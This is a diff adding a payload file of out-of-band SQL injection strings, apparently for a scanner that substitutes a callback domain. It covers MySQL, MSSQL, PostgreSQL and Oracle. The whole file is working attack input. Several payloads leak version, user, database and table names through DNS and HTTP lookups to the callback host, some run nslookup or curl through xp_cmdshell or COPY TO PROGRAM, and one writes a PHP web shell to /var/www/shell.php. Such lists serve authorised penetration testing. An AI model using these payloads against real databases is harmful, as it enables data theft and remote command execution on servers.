@@ -1,0 +1,68 @@
+# Out-of-Band (OOB) SQL Injection Payloads
+# These force the database to make external connections
+# {{CALLBACK}} will be replaced with the actual callback domain
+
+# MySQL - DNS exfiltration (Windows only)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.{{CALLBACK}}\\a'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.{{CALLBACK}}\\a'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.{{CALLBACK}}\\a'))--
+' AND LOAD_FILE(CONCAT('\\\\',@@version,'.{{CALLBACK}}\\a'))--
+' OR LOAD_FILE(CONCAT('\\\\',@@version,'.{{CALLBACK}}\\a'))--
+
+# MySQL - INTO OUTFILE (requires FILE privilege)
+' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'--
+' UNION SELECT 'test' INTO OUTFILE '\\\\{{CALLBACK}}\\share\\test.txt'--
+
+# MSSQL - DNS exfiltration
+'; EXEC master..xp_dirtree '\\{{CALLBACK}}\share';--
+'; EXEC master..xp_subdirs '\\{{CALLBACK}}\share';--
+'; EXEC master..xp_fileexist '\\{{CALLBACK}}\share\test.txt';--
+'; DECLARE @x VARCHAR(1024); SET @x=(SELECT @@version); EXEC('master..xp_dirtree "\\'+@x+'.{{CALLBACK}}\a"');--
+'; DECLARE @q VARCHAR(1024); SET @q='\\'+@@version+'.{{CALLBACK}}\a'; EXEC master..xp_dirtree @q;--
+
+# MSSQL - HTTP request (if enabled)
+'; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP',@obj OUT; EXEC sp_OAMethod @obj,'open',NULL,'GET','http://{{CALLBACK}}/'+@@version,false; EXEC sp_OAMethod @obj,'send';--
+
+# MSSQL - xp_cmdshell DNS
+'; EXEC xp_cmdshell 'nslookup {{CALLBACK}}';--
+'; EXEC xp_cmdshell 'ping {{CALLBACK}}';--
+
+# PostgreSQL - DNS exfiltration
+'; COPY (SELECT '') TO PROGRAM 'nslookup {{CALLBACK}}';--
+'; COPY (SELECT '') TO PROGRAM 'curl http://{{CALLBACK}}/'+version();--
+' OR (SELECT dblink_connect('host={{CALLBACK}} user=a password=a dbname=a'))--
+'; SELECT dblink_send_query('host={{CALLBACK}}','SELECT 1');--
+
+# PostgreSQL - lo_export
+'; SELECT lo_export(lo_creat(-1),'\\\\{{CALLBACK}}\\share\\test.txt');--
+
+# Oracle - UTL_HTTP
+' OR UTL_HTTP.REQUEST('http://{{CALLBACK}}/'||(SELECT user FROM dual))--
+' UNION SELECT UTL_HTTP.REQUEST('http://{{CALLBACK}}/'||banner) FROM v$version WHERE ROWNUM=1--
+' AND 1=1 AND UTL_HTTP.REQUEST('http://{{CALLBACK}}/ok')--
+
+# Oracle - UTL_INADDR (DNS)
+' OR 1=1 AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{{CALLBACK}}')--
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(banner||'.{{CALLBACK}}') FROM v$version WHERE ROWNUM=1--
+
+# Oracle - DBMS_LDAP
+' AND DBMS_LDAP.INIT((SELECT user FROM dual)||'.{{CALLBACK}}',389)--
+
+# Oracle - HTTPURITYPE
+' UNION SELECT HTTPURITYPE('http://{{CALLBACK}}/'||(SELECT user FROM dual)).getclob() FROM dual--
+
+# XXE in SQL (Oracle/MSSQL)
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{{CALLBACK}}/">]><root>&xxe;</root>'),'/root')--
+
+# DNS exfiltration with encoding
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',HEX(@@version),'.{{CALLBACK}}\\a'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',TO_BASE64(@@version),'.{{CALLBACK}}\\a'))--
+
+# Conditional OOB
+' AND IF(1=1,LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\a')),0)--
+'; IF (1=1) EXEC master..xp_dirtree '\\{{CALLBACK}}\a';--
+
+# Data exfiltration templates
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.{{CALLBACK}}\\a'))--
+'; DECLARE @d VARCHAR(1024); SELECT @d=name FROM master..sysdatabases; EXEC('xp_dirtree "\\'+@d+'.{{CALLBACK}}\a"');--
+
